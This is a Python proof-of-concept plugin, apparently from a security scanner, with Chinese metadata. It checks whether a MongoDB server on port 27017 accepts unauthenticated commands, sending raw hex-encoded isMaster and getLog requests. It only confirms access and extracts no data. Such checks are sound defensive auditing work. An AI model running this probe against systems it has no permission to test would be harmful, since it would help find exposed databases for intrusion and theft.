#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import socket
import binascii

def get_plugin_info():
    plugin_info = {
        "name": "mongodb 未授权",
        "desc": "导致数据库敏感信息泄露，严重可导致服务器被入侵。",
        "grade": "高",
        "type": "service",
        "keyword": "service:mongodb port:27017",
    }
    return plugin_info

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':27017'
    host,port = check_port(arg).split(':')
    timeout = 5
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        data = binascii.a2b_hex(
            "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
        s.send(data)
        result = s.recv(1024)
        if b"ismaster" in result:
            getlog_data = binascii.a2b_hex(
                "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
            s.send(getlog_data)
            result = s.recv(1024)
            if b"totalLinesWritten" in result:
                return True
            else:
                return False
    except Exception:
        pass
    
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
